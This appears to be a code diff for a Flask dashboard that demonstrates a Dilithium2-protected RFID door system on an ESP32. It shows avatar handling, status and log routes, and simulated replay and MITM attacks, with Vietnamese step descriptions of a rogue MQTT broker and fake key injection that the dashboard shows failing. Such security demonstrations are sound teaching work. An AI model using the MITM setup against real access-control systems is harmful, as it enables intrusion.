-            <circle cx="50" cy="35" r="15" fill="white"/>
-            <ellipse cx="50" cy="75" rx="25" ry="20" fill="white"/>
-            <text x="50" y="95" text-anchor="middle" fill="white" font-size="8">User 2</text>
-        </svg>'''
-        
-        default_svg = '''<svg width="100" height="100" viewBox="0 0 100 100" xmlns="http://www.w3.org/2000/svg">
-            <circle cx="50" cy="50" r="50" fill="#a0aec0"/>
-            <circle cx="50" cy="35" r="15" fill="white"/>
-            <ellipse cx="50" cy="75" rx="25" ry="20" fill="white"/>
-            <text x="50" y="95" text-anchor="middle" fill="white" font-size="8">Guest</text>
-        </svg>'''
-        
-        images_dir = os.path.join(self.static_dir, "images")
-        
-        with open(os.path.join(images_dir, "user1.svg"), 'w') as f:
-            f.write(user1_svg)
-        
-        with open(os.path.join(images_dir, "user2.svg"), 'w') as f:
-            f.write(user2_svg)
-        
-        with open(os.path.join(images_dir, "default_user.svg"), 'w') as f:
-            f.write(default_svg)
+        except Exception as e:
+            print(f"⚠️ Could not create user images: {e}")
+            print("📝 Dashboard will work without user images")
 
-# Flask routes
+    def get_user_image(self, card_uid):
+        """Get user image based on card UID - Updated to handle both PIL and SVG"""
+        # Check if PIL images exist first, then SVG fallback
+        user_images_pil = {
+            "9C85C705": "/static/images/user1.jpg",
+            "3D8BC705": "/static/images/user2.JPG",
+            "A1B2C3D4": "/static/images/admin.png",
+            "E5F6G7H8": "/static/images/guest.png"
+        }
+        
+        user_images_svg = {
+            "9C85C705": "/static/images/user1.svg",
+            "3D8BC705": "/static/images/user2.svg",
+            "A1B2C3D4": "/static/images/admin.svg",
+            "E5F6G7H8": "/static/images/guest.svg"
+        }
+        
+        # Try PIL images first
+        pil_path = user_images_pil.get(card_uid, "/static/images/default_user.png")
+        if os.path.exists(os.path.join(self.static_dir, "images", os.path.basename(pil_path))):
+            return pil_path
+        
+        # Fallback to SVG
+        svg_path = user_images_svg.get(card_uid, "/static/images/default_user.svg")
+        if os.path.exists(os.path.join(self.static_dir, "images", os.path.basename(svg_path))):
+            return svg_path
+        
+        # Final fallback - create a simple data URL
+        return "data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMjAwIiBoZWlnaHQ9IjIwMCIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj4KICAgIDxyZWN0IHdpZHRoPSIyMDAiIGhlaWdodD0iMjAwIiBmaWxsPSIjOWI1OWI2Ii8+CiAgICA8dGV4dCB4PSIxMDAiIHk9IjEwMCIgZm9udC1mYW1pbHk9IkFyaWFsIiBmb250LXNpemU9IjIwIiBmaWxsPSJ3aGl0ZSIgdGV4dC1hbmNob3I9Im1pZGRsZSIgZG9taW5hbnQtYmFzZWxpbmU9Im1pZGRsZSI+CiAgICAgICAgREVGQVVMVAogICAgPC90ZXh0Pgo8L3N2Zz4="
+
+    def _get_mitm_attack_steps(self, server_data):
+        """Get initial MITM attack steps"""
+        return [
+            {
+                "step": 1,
+                "title": "🎭 Thiết lập MITM Infrastructure & Card Listener",
+                "details": [
+                    "Khởi động rogue MQTT broker trên port 1884...",
+                    "Tạo fake SSL certificate cho 'localhost'...",
+                    "Thiết lập card detection listener...",
+                    "🚨 MITM đang chờ bạn quét thẻ để intercept...",
+                    "📱 Hãy quét thẻ của bạn vào ESP32 để thấy MITM hoạt động!",
+                    "🎯 MITM sẽ tự động inject fake key khi detect card..."
+                ],
+                "technical_details": {
+                    "mitm_setup": {
+                        "fake_mqtt_broker": {
+                            "host": "0.0.0.0",
+                            "port": 1884,
+                            "status": "ACTIVE",
+                            "listening_for": "card_detected events",
+                            "target_uid": "ANY_SCANNED_CARD"
+                        },
+                        "card_listener": {
+                            "subscribed_topics": ["rfid/+", "rfid/esp32_to_server"],
+                            "waiting_for": "card_detected message",
+                            "auto_inject": True,
+                            "fake_key_ready": True
+                        },
+                        "fake_dilithium_keys": {
+                            "algorithm": "Dilithium2",
+                            "fake_private_key_size": "2528 bytes",
+                            "fake_public_key_size": "1312 bytes",
+                            "fake_fingerprint": hashlib.sha256(b"fake_dilithium_key").hexdigest()[:32],
+                            "real_fingerprint": server_data["server_fingerprint"],
+                            "injection_trigger": "ON_CARD_SCAN"
+                        }
+                    }
+                },
+                "real_action": "setup_mitm_listener",
+                "duration": 3
+            },
+            {
+                "step": 2,
+                "title": "🚨 MITM Đang Chờ Card Scan Event...",
+                "details": [
+                    "📱 MITM listener đã sẵn sàng...",
+                    "🎯 Chờ ESP32 phát hiện thẻ RFID...",
+                    "⚡ Khi có card_detected → MITM sẽ tự động inject fake auth_challenge",
+                    "🔐 Fake challenge sẽ chứa key giả mạo của attacker",
+                    "🛡️ ESP32 sẽ verify signature → phát hiện MITM",
+                    "📊 Mutual authentication sẽ ngăn chặn attack..."
+                ],
+                "technical_details": {
+                    "waiting_status": {
+                        "listener_active": True,
+                        "mqtt_subscriptions": ["rfid/esp32_to_server", "rfid/+"],
+                        "trigger_event": "card_detected",
+                        "injection_ready": True,
+                        "fake_challenge_prepared": {
+                            "session_id": f"MITM_{secrets.token_hex(8)}",
+                            "fake_server_pubkey": base64.b64encode(secrets.token_bytes(1312)).decode()[:64] + "...",
+                            "fake_signature": base64.b64encode(secrets.token_bytes(2420)).decode()[:64] + "...",
+                            "injection_method": "Real-time MQTT injection"
+                        }
+                    },
+                    "detection_mechanism": {
+                        "esp32_will_verify": "dilithium_verify(stored_key, message, signature)",
+                        "expected_result": "SIGNATURE_VERIFICATION_FAILED",
+                        "mutual_auth_protection": "ESP32 has real server public key stored",
+                        "attack_success_probability": "0% (cryptographically impossible)"
+                    }
+                },
+                "real_action": "wait_for_card",
+                "duration": 10
+            }
+        ]
+    
+    # Continue with remaining methods...
+    def run_dashboard(self):
+        """Start the web dashboard"""
+        print("🌐 Starting Dilithium RFID Security Dashboard...")
+        print("📊 Dashboard URL: http://localhost:5000")
+        print("🎯 Features: Real-time MQTT monitoring, Attack simulation, Door animation")
+        print("🔒 Security: Post-quantum Dilithium2 + AES-128 encryption")
+        socketio.run(app, host='0.0.0.0', port=5000, debug=False)
+
+# Global dashboard instance
 dashboard = DilithiumWebDashboard()
 
-@app.route('/api/attack/start', methods=['POST'])
-def start_attack():
-    """Start enhanced attack simulation"""
-    data = request.json
-    attack_type = data.get('type')
-    
-    if dashboard.attack_active:
-        return jsonify({"error": "Attack already in progress"}), 400
-    
-    dashboard.attack_active = True
-    dashboard.attack_type = attack_type
-    dashboard.attack_logs = []
-    
-    print(f"🚨 Starting {attack_type} attack simulation...")
-    
-    if attack_type == "replay":
-        threading.Thread(target=dashboard.simulate_replay_attack).start()
-    elif attack_type == "mitm":
-        threading.Thread(target=dashboard.simulate_mitm_attack).start()
-    
-    return jsonify({"status": "Attack started", "type": attack_type})
-
-@app.route('/api/attack/stop', methods=['POST'])
-def stop_attack():
-    """Stop attack simulation"""
-    dashboard.attack_active = False
-    dashboard.attack_type = None
-    print("🛑 Attack simulation stopped")
-    
-    return jsonify({"status": "Attack stopped"})
-
+# Flask routes
 @app.route('/')
 def index():
     return render_template('index.html')
@@ -2913,79 +3352,47 @@ def index():
 def static_files(filename):
     return send_from_directory(dashboard.static_dir, filename)
 
-@app.route('/api/esp32/status')
-def get_esp32_status():
-    """Get current ESP32 status"""
-    return jsonify(dashboard.esp32_status)
-
-@app.route('/api/cards')
-def get_cards():
-    """Get all provisioned cards"""
-    cards_db_path = os.path.join(dashboard.config_dir, "cards_database.json")
+@app.route('/start_attack', methods=['POST'])
+def start_attack():
+    attack_data = request.get_json()
+    attack_type = attack_data.get('type')
     
-    if not os.path.exists(cards_db_path):
-        return jsonify([])
+    if dashboard.attack_active:
+        return jsonify({"status": "error", "message": "Attack already in progress"})
     
-    try:
-        with open(cards_db_path, 'r') as f:
-            cards_db = json.load(f)
-        
-        cards_list = []
-        for uid, data in cards_db.items():
-            cards_list.append({
-                "uid": uid,
-                "name": data.get("user_name", "Unknown"),
-                "status": data.get("status", "unknown"),
-                "permissions": data.get("permissions", []),
-                "last_used": data.get("last_used", "Never")
-            })
-        
-        return jsonify(cards_list)
-    except:
-        return jsonify([])
+    dashboard.attack_active = True
+    dashboard.attack_type = attack_type
+    
+    if attack_type == 'replay':
+        threading.Thread(target=dashboard.simulate_replay_attack).start()
+    elif attack_type == 'mitm':
+        threading.Thread(target=dashboard.simulate_mitm_attack).start()
+    
+    return jsonify({"status": "success", "attack_type": attack_type})
 
-@app.route('/api/logs')
+@app.route('/stop_attack', methods=['POST'])
+def stop_attack():
+    dashboard.attack_active = False
+    dashboard.attack_type = None
+    dashboard.mitm_waiting_for_card = False
+    
+    return jsonify({"status": "success"})
+
+@app.route('/get_logs')
 def get_logs():
-    """Get system logs with filtering"""
-    log_type = request.args.get('type', 'all')
-    limit = int(request.args.get('limit', 50))
-    
-    filtered_logs = dashboard.system_logs
-    if log_type != 'all':
-        filtered_logs = [log for log in dashboard.system_logs if log.get('type') == log_type]
-    
-    return jsonify(filtered_logs[-limit:])
+    return jsonify(dashboard.system_logs[-50:])  # Return last 50 logs
 
-@socketio.on('connect')
-def handle_connect():
-    """Handle WebSocket connection"""
-    print('🌐 Client connected to dashboard')
-    emit('connected', {'status': 'Connected to Dilithium Dashboard'})
-    emit('esp32_status', dashboard.esp32_status)
 
-@socketio.on('disconnect')
-def handle_disconnect():
-    """Handle WebSocket disconnection"""
-    print('🌐 Client disconnected from dashboard')
+@app.route('/get_status')
+def get_status():
+    return jsonify({
+        "door_state": dashboard.door_state,
+        "current_user": dashboard.current_user,
+        "attack_active": dashboard.attack_active,
+        "attack_type": dashboard.attack_type,
+        "esp32_status": dashboard.esp32_status,
+        "total_logs": len(dashboard.system_logs)
+    })
 
-if __name__ == '__main__':
-    print("🌐 Starting Enhanced Dilithium RFID Security Dashboard...")
-    print("📊 Enhanced Features:")
-    print("   - Real-time ESP32 monitoring")
-    print("   - Detailed attack parameter analysis")
-    print("   - Technical cryptographic visualization")
-    print("   - Post-quantum security demonstration")
-    print("   - Enhanced logging with message size tracking")
-    print("   - Live system performance metrics")
-    print()
-    
-    import socket
-    hostname = socket.gethostname()
-    local_ip = socket.gethostbyname(hostname)
-    
-    print("🔗 Access dashboard at:")
-    print(f"   - Local: http://localhost:5000")
-    print(f"   - Network: http://{local_ip}:5000")
-    print()
-    
-    socketio.run(app, host='0.0.0.0', port=5000, debug=False)
+if __name__ == "__main__":
+    dashboard.run_dashboard()
